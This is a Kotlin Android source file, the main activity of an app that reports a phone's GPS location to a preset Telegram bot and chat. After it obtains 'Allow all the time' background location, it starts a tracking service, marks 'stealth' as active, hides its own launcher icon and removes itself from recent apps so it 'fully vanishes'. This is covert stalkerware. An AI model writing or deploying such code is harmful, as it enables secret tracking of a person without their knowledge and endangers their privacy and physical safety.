package com.gpstracker.telegram

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.google.android.material.snackbar.Snackbar
import com.gpstracker.telegram.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE) }

    // ─── Permission launchers ─────────────────────────────────────────────────

    private val fineLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val granted = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        if (granted) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) requestBackgroundLocation()
            else proceedWithActivation()
        } else {
            showPermissionDialog()
        }
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) proceedWithActivation()
        else showBackgroundPermissionDialog()
    }

    private val notificationPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* optional — continue regardless */ }

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Ask for notification permission early on Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                notificationPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        prefillCredentials()

        val stealthAlreadyActive = prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)
        if (stealthAlreadyActive) {
            showStealthActiveScreen()
        } else {
            binding.layoutSetup.visibility = View.VISIBLE
            binding.cardActive.visibility  = View.GONE
        }

        binding.btnTest.setOnClickListener { sendTestMessage() }
        binding.btnActivate.setOnClickListener {
            saveCredentials()
            checkAndRequestPermissions()
        }
    }

    // ─── Credential helpers ───────────────────────────────────────────────────

    private fun prefillCredentials() {
        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, null)
        val chatId = prefs.getString(Prefs.KEY_CHAT_ID, null)
        if (token.isNullOrBlank())  prefs.edit().putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN).apply()
        if (chatId.isNullOrBlank()) prefs.edit().putString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID).apply()
        binding.etBotToken.setText(if (token.isNullOrBlank())  Prefs.DEFAULT_BOT_TOKEN else token)
        binding.etChatId.setText(if (chatId.isNullOrBlank()) Prefs.DEFAULT_CHAT_ID else chatId)
    }

    private fun saveCredentials() {
        val token  = binding.etBotToken.text?.toString()?.trim() ?: Prefs.DEFAULT_BOT_TOKEN
        val chatId = binding.etChatId.text?.toString()?.trim()  ?: Prefs.DEFAULT_CHAT_ID
        prefs.edit()
            .putString(Prefs.KEY_BOT_TOKEN, token.ifBlank  { Prefs.DEFAULT_BOT_TOKEN })
            .putString(Prefs.KEY_CHAT_ID,   chatId.ifBlank { Prefs.DEFAULT_CHAT_ID })
            .apply()
    }

    // ─── Permission flow ──────────────────────────────────────────────────────

    private fun checkAndRequestPermissions() {
        val hasFine = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasFine) {
            fineLocationLauncher.launch(
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val hasBackground = ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            if (!hasBackground) {
                requestBackgroundLocation()
                return
            }
        }

        proceedWithActivation()
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            AlertDialog.Builder(this)
                .setTitle("Background location required")
                .setMessage(
                    "For silent background tracking, select\n\"Allow all the time\" on the next screen."
                )
                .setPositiveButton("Continue") { _, _ ->
                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }
                .setCancelable(false)
                .show()
        }
    }

    // ─── Activation ───────────────────────────────────────────────────────────

    private fun proceedWithActivation() {
        // Clear any saved start location so the service establishes a fresh
        // origin and sends the initial "online + location" message right away.
        prefs.edit()
            .putBoolean(Prefs.KEY_TRACKING_ACTIVE, true)
            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED, true)
            .remove(Prefs.KEY_START_LAT)
            .remove(Prefs.KEY_START_LNG)
            .remove(Prefs.KEY_LAST_SENT_TIME)
            .apply()

        // Start the foreground service
        val intent = Intent(this, LocationTrackingService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        showStealthActiveScreen()

        // After 1.5 s: hide icon + remove from recents so the app fully vanishes
        Handler(Looper.getMainLooper()).postDelayed({
            hideLauncherIcon()
            finishAndRemoveTask()   // removes from recent-apps carousel
        }, 1500)

        Log.d("MainActivity", "Stealth activated — will vanish from recents")
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MainActivity", "Launcher icon hidden")
        } catch (e: Exception) {
            Log.e("MainActivity", "Could not hide icon: ${e.message}")
        }
    }

    private fun showStealthActiveScreen() {
        binding.layoutSetup.visibility = View.GONE
        binding.cardActive.visibility  = View.VISIBLE
    }

    // ─── Test message ─────────────────────────────────────────────────────────

    private fun sendTestMessage() {
        saveCredentials()
        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
        val chatId = prefs.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID

        if (token.isBlank() || chatId.isBlank()) {
            snack("Enter Bot Token and Chat ID first")
            return
        }

        binding.btnTest.isEnabled = false
        binding.btnTest.text = "Sending…"

        val lat = prefs.getFloat(Prefs.KEY_CURRENT_LAT, Float.MIN_VALUE)
        val lng = prefs.getFloat(Prefs.KEY_CURRENT_LNG, Float.MIN_VALUE)
        val latD = if (lat != Float.MIN_VALUE) lat.toDouble() else null
        val lngD = if (lng != Float.MIN_VALUE) lng.toDouble() else null

        lifecycleScope.launch {
            val success = withContext(Dispatchers.IO) {
                TelegramApi.sendMessage(token, chatId, TelegramApi.buildTestMessage(latD, lngD))
            }
            binding.btnTest.isEnabled = true
            binding.btnTest.text = "Send Test Message"
            snack(if (success) "✓ Test message sent!" else "Failed — check credentials")
        }
    }

    // ─── Permission denied dialogs ────────────────────────────────────────────

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Location permission required")
            .setMessage("This app needs location permission to track the phone. Please allow it in settings.")
            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showBackgroundPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("\"Allow all the time\" required")
            .setMessage("Open app settings and set location to \"Allow all the time\" so tracking works when the screen is off.")
            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    private fun snack(msg: String) = Snackbar.make(binding.root, msg, Snackbar.LENGTH_LONG).show()
}
